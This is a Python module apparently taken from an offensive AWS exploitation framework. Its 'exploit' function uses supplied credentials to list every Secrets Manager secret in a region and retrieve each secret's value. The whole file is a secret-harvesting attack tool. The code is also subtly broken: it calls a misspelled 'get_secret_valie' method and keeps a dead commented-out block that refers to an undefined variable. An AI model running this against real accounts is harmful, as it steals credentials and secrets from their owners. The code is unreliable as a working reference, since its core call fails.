from mongoengine import DoesNotExist
from core.database.models import AWSUsers
from core.createSession.giveMeClient import giveMeClient

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "secretsmanager",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"SECRET-NAME": {
		"value": "",
		"required": "false",
        "description":"The SecretsManager Secret Name to check."
	}
}
description = "If the secret name is not added, list all secrets on a region and download the secret value. Otherwise, just get the secret required."

aws_command = ""#aws iam get-user --user-name <user>  --region <region> --profile <profile>"

calls = [
	"secretsmanager:ListSecrets",
	"secretsmanager:GetSecretValue"
]

def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
	try:
		secretName = variables['SECRET-NAME']['value']

		smProfile = giveMeClient(
			all_sessions,
			cred_prof,
			useragent,
			web_proxies,
			"secretsmanager"
		)

		if secretName != "":
			secretnames = [secretName]
		else:
			secretnames = []
			result = smProfile.list_secrets()
			secrets = result['SecretList']

			while "NextToken" in result and result['NextToken'] != "":
				result = smProfile.list_secrets(
					NextToken=result['NextToken']
				)
				secrets.extend(result['SecretList'])

			for ressecret in secrets:
				secretnames.append(ressecret['Name'])

		returndict = []


		for secret in secretnames:
			try:
				secretValueReq = smProfile.get_secret_valie(SecretId=secret)
				if 'SecretString' in secretValueReq:
					returndict.append(
						{
							"Name": secret,
							'SecretString': secretValueReq['SecretString']
						}
					)
			except Exception as e:
				returndict.append(
					{
						"Name": secret,
						'SecretString': str(e)
					}
				)
		'''
		database_data = {
			"aws_username": user['UserName'],
			"aws_user_arn": user['Arn'],
			"aws_user_id": user['UserId'],
			"aws_user_create_date": user['CreateDate'],
			"aws_account_id": user['Arn'].split(":")[4]
		}

		try:
			aws_user = AWSUsers.objects.get(aws_username=user['UserName'])
			aws_user.modify(**database_data)
			aws_user.save()

		except DoesNotExist:
			AWSUsers(**database_data).save()

		except Exception as e:
			return {"error": "Error from module: {}".format(str(e))}, 500
		'''
		return {"Name": returndict}

	except Exception as e:
		return {"error": str(e)}
